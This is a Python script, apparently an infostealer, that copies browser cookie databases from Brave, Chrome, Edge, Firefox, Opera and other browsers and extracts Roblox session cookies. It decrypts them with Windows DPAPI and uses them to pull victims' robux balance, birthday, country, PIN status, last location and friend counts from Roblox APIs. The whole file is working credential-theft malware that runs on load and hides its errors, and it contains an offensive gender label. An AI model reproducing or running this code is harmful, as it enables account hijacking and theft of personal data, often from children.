import os
import sqlite3
from pathlib import Path
import win32crypt
import glob
import aiohttp
import asyncio
import json

class RobloxCookieFetcher:
    def __init__(self):
        self.browser_paths = {
            "brave": os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
            "chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
            "chromium": os.path.join(os.getenv("localappdata"), "Chromium", "User Data", "Default", "Network", "Cookies"),
            "comodo": os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data", "Default", "Network", "Cookies"),
            "edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
            "epicprivacy": os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data", "Default", "Network", "Cookies"),
            "iridium": os.path.join(os.getenv("localappdata"), "Iridium", "User Data", "Default", "Network", "Cookies"),
            "opera": os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable", "Network", "Cookies"),
            "opera_gx": os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable", "Network", "Cookies"),
            "slimjet": os.path.join(os.getenv("localappdata"), "Slimjet", "User Data", "Default", "Network", "Cookies"),
            "ur": os.path.join(os.getenv("localappdata"), "UR Browser", "User Data", "Default", "Network", "Cookies"),
            "vivaldi": os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data", "Default", "Network", "Cookies"),
            "yandex": os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies"),
            "firefox": f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        }
        self.roblox_cookies = {}

    def find_firefox_profiles(self, firefox_base_path):
        cookie_files = []
        if os.path.exists(firefox_base_path):
            for profile in glob.glob(os.path.join(firefox_base_path, "*")):
                cookie_path = os.path.join(profile, "cookies.sqlite")
                if os.path.exists(cookie_path):
                    cookie_files.append(cookie_path)
        return cookie_files

    def steal_cookies(self, browser, cookie_path):
        try:
            temp_path = os.path.join(os.getenv("TEMP"), f"{browser}_cookies_temp")
            with open(cookie_path, 'rb') as src, open(temp_path, 'wb') as dst:
                dst.write(src.read())
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            if browser == "firefox":
                cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies WHERE host IN ('www.roblox.com', '.roblox.com') AND name IN ('.ROBLOSECURITY', '.RBXIDCHECK')")
            else:
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies WHERE host_key IN ('www.roblox.com', '.roblox.com') AND name IN ('.ROBLOSECURITY', '.RBXIDCHECK')")
            cookies = []
            for row in cursor.fetchall():
                if browser == "firefox":
                    cookie = {
                        "domain": row[0],
                        "name": row[1],
                        "value": row[2],
                        "path": row[3],
                        "expires": row[4]
                    }
                else:
                    try:
                        decrypted_value = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8')
                    except:
                        decrypted_value = row[2].decode('utf-8', errors='ignore')
                    cookie = {
                        "domain": row[0],
                        "name": row[1],
                        "value": decrypted_value,
                        "path": row[3],
                        "expires": row[4]
                    }
                cookies.append(cookie)
            conn.close()
            os.remove(temp_path)
            return cookies
        except:
            return []

    def collect_cookies(self):
        for browser, path in self.browser_paths.items():
            if browser == "firefox":
                firefox_cookie_files = self.find_firefox_profiles(path)
                for i, cookie_file in enumerate(firefox_cookie_files):
                    profile_name = f"firefox_profile_{i+1}"
                    self.roblox_cookies[profile_name] = {"cookie_data": self.steal_cookies("firefox", cookie_file), "account_info": None}
            else:
                self.roblox_cookies[browser] = {"cookie_data": self.steal_cookies(browser, path), "account_info": None}

    async def get_birthday(self, session):
        try:
            async with session.get("https://users.roblox.com/v1/birthdate", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return f'{data.get("birthMonth")}/{data.get("birthDay")}/{data.get("birthYear")}'
                return None
        except:
            return None

    async def get_gender(self, session):
        try:
            async with session.get("https://users.roblox.com/v1/gender", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    gender = data.get("gender")
                    if gender == 1: return "Gay"
                    elif gender == 2: return "Male"
                    elif gender == 3: return "Female"
                    else: return None
                return None
        except:
            return None

    async def get_info(self, session, id):
        try:
            async with session.get(f"https://users.roblox.com/v1/users/{id}", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data
                return None
        except:
            return None

    async def get_robux(self, session, id):
        try:
            async with session.get(f"https://economy.roblox.com/v1/users/{id}/currency", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("robux")
                return None
        except:
            return None

    async def get_emailver(self, session):
        try:
            async with session.get(f"https://accountsettings.roblox.com/v1/email", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("verified")
                return None
        except:
            return None

    async def get_agever(self, session):
        try:
            async with session.get(f"https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("isVerified")
                return None
        except:
            return None

    async def get_country(self, session):
        try:
            async with session.get(f"https://accountsettings.roblox.com/v1/account/settings/account-country", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("value").get("countryName")
                return None
        except:
            return None

    async def get_pinstatus(self, session):
        try:
            async with session.get(f"https://auth.roblox.com/v1/account/pin", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("isEnabled")
                return None
        except:
            return None

    async def get_lastlocation(self, session, id):
        try:
            async with session.post(f"https://presence.roblox.com/v1/presence/users", json={"userIds": [id]}, ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("userPresences")[0].get("lastLocation")
                return None
        except:
            return None

    async def get_followers(self, session, id):
        try:
            async with session.get(f"https://friends.roblox.com/v1/users/{id}/followers/count", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("count")
                return None
        except:
            return None

    async def get_friends(self, session, id):
        try:
            async with session.get(f"https://friends.roblox.com/v1/users/{id}/friends/count", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("count")
                return None
        except:
            return None

    async def get_pending(self, session, id):
        try:
            async with session.get(f"https://economy.roblox.com/v2/users/{id}/transaction-totals?timeFrame=Year&transactionType=summary", ssl=False) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("pendingRobuxTotal")
                return None
        except:
            return None

    async def get_games(self, session, id):
        try:
            cursor = ''
            total_games = []
            while True:
                async with session.get(f"https://games.roblox.com/v2/users/{id}/games?limit=50&sortOrder=Asc&cursor={cursor}", ssl=False) as response:
                    if response.status == 200:
                        data = await response.json()
                        games = data.get("data")
                        for game in games:
                            total_games.append(game)
                        if data.get("nextPageCursor"):
                            cursor = data.get("nextPageCursor")
                        else:
                            return len(total_games)
                    return None
        except:
            return None

    async def start(self, cookie, browser):
        try:
            async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": cookie}) as session:
                async with session.get("https://users.roblox.com/v1/users/authenticated", ssl=False) as response:
                    if response.status == 200:
                        data = await response.json()
                        user_id = data.get("id")
                        tasks = [
                            asyncio.create_task(self.get_birthday(session)),
                            asyncio.create_task(self.get_gender(session)),
                            asyncio.create_task(self.get_info(session, user_id)),
                            asyncio.create_task(self.get_robux(session, user_id)),
                            asyncio.create_task(self.get_emailver(session)),
                            asyncio.create_task(self.get_agever(session)),
                            asyncio.create_task(self.get_country(session)),
                            asyncio.create_task(self.get_pinstatus(session)),
                            asyncio.create_task(self.get_lastlocation(session, user_id)),
                            asyncio.create_task(self.get_followers(session, user_id)),
                            asyncio.create_task(self.get_friends(session, user_id)),
                            asyncio.create_task(self.get_pending(session, user_id)),
                            asyncio.create_task(self.get_games(session, user_id))
                        ]
                        results = await asyncio.gather(*tasks)
                        birthday, gender, info, robux, emailver, agever, country, pinstatus, lastlocation, followers, friends, pending, games = results

                        if info:
                            created = info.get("created")
                            user_name = data.get("name")
                            display_name = data.get("displayName")
                            self.roblox_cookies[browser]["account_info"] = {
                                "USER ID": user_id,
                                "USERNAME": user_name,
                                "DISPLAY NAME": display_name,
                                "ROBUX": robux,
                                "EMAIL VERIFIED": emailver,
                                "AGE VERIFIED": agever,
                                "COUNTRY": country,
                                "BIRTHDAY": birthday,
                                "PIN STATUS": 'Enabled' if pinstatus else 'Disabled',
                                "GENDER": gender,
                                "LAST LOCATION": lastlocation,
                                "CREATED": created,
                                "FOLLOWERS": followers,
                                "FRIENDS": friends,
                                "GAMES": games,
                                "PENDING ROBUX": pending,
                            }
        except:
            pass

    async def run(self):
        self.collect_cookies()
        for browser, data in self.roblox_cookies.items():
            for cookie in data["cookie_data"]:
                if cookie["name"] == ".ROBLOSECURITY":
                    await self.start(cookie["value"], browser)
        return self.roblox_cookies


fetcher = RobloxCookieFetcher()
roblox_cookies = asyncio.run(fetcher.run())
